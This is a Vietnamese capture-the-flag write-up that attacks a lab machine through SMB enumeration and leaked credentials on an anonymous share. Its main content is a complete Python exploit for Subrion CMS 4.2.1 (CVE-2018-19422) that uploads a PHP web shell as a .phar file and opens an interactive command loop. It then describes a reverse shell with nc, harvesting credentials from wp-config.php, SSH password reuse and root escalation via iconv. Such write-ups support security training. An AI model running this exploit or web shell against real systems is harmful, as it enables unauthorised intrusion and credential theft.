ở đây nó có cổng smb

<img width="2209" height="1197" alt="image" src="https://github.com/user-attachments/assets/7530fa6e-c877-4555-b027-9f275a553240" />

bây giờ ta sẽ đi tìm username bằng cách dùng smbmap `smbmap -H IP`

<img width="2544" height="796" alt="image" src="https://github.com/user-attachments/assets/5cbe7a1e-9b44-458c-87ac-fdceb6081403" />

có được folder share rồi thì mình sẽ vào xem thử coi có gì `smbclient //IP/websvr -N -U ""` thì có được file enter.txt

<img width="630" height="240" alt="image" src="https://github.com/user-attachments/assets/75841e21-facd-414e-b8af-1a3fd0191718" />

ở đây có trang ẩn là /subrion và tải khoản mật khẩu nhưng trang subrion hiện không hoạt động nên ta sẽ vào /panel (lên cyberchef giải mã admin:Scam2021)

trang này đang sử dụng subrion version 4.2.1, lỗ hổng `uploads`, mình sẽ sửa script một xíu để RCE nhe

<img width="2376" height="1193" alt="image" src="https://github.com/user-attachments/assets/f1258c97-3526-420e-a2f1-b472effff5cb" />

```
#!/usr/bin/python3

# Subrion CMS 4.2.1 - CVE-2018-19422 

import requests
import time
import optparse
import random
import string
import urllib.parse
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings()

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Panel URL (e.g. http://10.49.168.177/subrion/panel/)")
parser.add_option('-l', '--user', action="store", dest="user", help="Username")
parser.add_option('-p', '--passw', action="store", dest="passw", help="Password")

options, args = parser.parse_args()

if not options.url or not options.user or not options.passw:
    print('[+] Usage: python3 exploit.py -u http://10.49.168.177/subrion/panel/ -l admin -p password')
    exit()

# URL setup
# Panel:  http://10.49.168.177/subrion/panel/
# Upload: http://10.49.168.177/subrion/panel/uploads/read.json
# Shell:  http://10.49.168.177/subrion/uploads/<name>.phar
url_login = options.url if options.url.endswith('/') else options.url + '/'
url_upload = url_login + 'uploads/read.json'
username = options.user
password = options.passw

session = requests.Session()
session.verify = False

csrfToken = ""
shell_name = ""

def login():
    global csrfToken
    print('[+] CVE-2018-19422 - SubrionCMS 4.2.1 RCE\n')
    print('[+] Target: ' + url_login)
    try:
        r = session.get(url_login)
        soup = BeautifulSoup(r.text, 'html.parser')
        token = soup.find('input', attrs={'name': '__st'})
        if not token:
            print('[x] No CSRF token found. Wrong URL?')
            exit()

        csrfToken = token['value']
        print(f'[+] CSRF: {csrfToken}')

        auth = session.post(url_login, data={
            "__st": csrfToken,
            "username": username,
            "password": password
        }, allow_redirects=True)

        if 'logout' in auth.text.lower() or 'dashboard' in auth.text.lower():
            print('[+] Login OK!\n')
        elif 'incorrect' in auth.text.lower() or 'wrong' in auth.text.lower():
            print('[x] Login FAILED')
            exit()
        else:
            print('[!] Login unclear, continuing...\n')

    except requests.exceptions.ConnectionError:
        print('[x] Cannot connect to ' + url_login)
        exit()

def gen_name():
    global shell_name
    shell_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
    print(f'[+] Shell name: {shell_name}.phar\n')

def upload():
    global csrfToken
    print('[+] Uploading shell...')
    print(f'[+] Upload endpoint: {url_upload}')

    # Refresh CSRF
    try:
        page = session.get(url_login + 'uploads/')
        soup = BeautifulSoup(page.text, 'html.parser')
        t = soup.find('input', attrs={'name': '__st'})
        if t:
            csrfToken = t['value']
            print(f'[+] Fresh CSRF: {csrfToken}')
    except:
        pass

    boundary = "-----------------------------6159367931540763043609390275"

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}"
    }

    data = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"reqid\"\r\n\r\n"
        f"17978446266285\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"cmd\"\r\n\r\n"
        f"upload\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"target\"\r\n\r\n"
        f"l1_Lw\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"__st\"\r\n\r\n"
        f"{csrfToken}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"upload[]\"; filename=\"{shell_name}.phar\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
        f"<?php if(isset($_GET['cmd'])){{ $c=$_GET['cmd']; echo '<pre>'; passthru($c); echo '</pre>'; }} ?>\n\r\n"
        f"--{boundary}--\r\n"
    )

    resp = session.post(url_upload, headers=headers, data=data)
    print(f'[+] Status: {resp.status_code}')
    print(f'[+] Response: {resp.text[:500]}\n')

def rce():
    # /subrion/panel/ -> /subrion/uploads/
    base = url_login[:url_login.index('/panel')]
    shell_url = base + '/uploads/' + shell_name + '.phar'

    print(f'[+] Shell URL: {shell_url}')

    try:
        r = session.get(shell_url + '?cmd=id')

        if r.status_code == 200 and r.text.strip():
            print(f'[+] RCE OK! id = {r.text.strip()}\n')

            while True:
                try:
                    cmd = input('$ ')
                    if cmd.lower() in ['exit', 'quit']:
                        break
                    if not cmd.strip():
                        continue
                    out = session.get(shell_url + '?cmd=' + urllib.parse.quote(cmd))
                    print(out.text.strip() if out.text.strip() else '[!] No output')
                except KeyboardInterrupt:
                    break
        else:
            print(f'[x] Shell not found (HTTP {r.status_code})')
            print(f'[!] Manual check: {shell_url}?cmd=id')
    except Exception as e:
        print(f'[x] Error: {e}')

login()
gen_name()
upload()
rce()
```

sử dụng command này để rce lên : `python3 49876.py -u http://10.49.184.169/subrion/panel/ -l admin -p Scam2021`

do shell này nó ít chứ năng nên mình sẽ thực thi file php `php reshell.php` và mở cổng nc

<img width="1689" height="518" alt="image" src="https://github.com/user-attachments/assets/11086244-529f-4f84-896a-35211d7f39a6" />

ở đây mình sẽ đi lục các thư mục xem có gì `cat /var/www/html/wordpress/wp-config.php`

<img width="1554" height="872" alt="image" src="https://github.com/user-attachments/assets/2e87b5ad-abf7-472a-b322-5b643ef61df7" />

do chỉ có 1 user là scamsite, support user không tồn tại trên server nên mình sẽ thử ssh lên với mật khẩu của support và username scamsite

<img width="1769" height="1215" alt="image" src="https://github.com/user-attachments/assets/a1f975a0-e809-466d-9af3-c3922c7cebe0" />

vậy là mình đã đọc được root flag (leo quyền root tìm ở trang https://gtfobins.org/gtfobins/iconv/)

<img width="2150" height="408" alt="image" src="https://github.com/user-attachments/assets/6305bd74-e6ff-4cbc-9e67-15503d97e7df" />






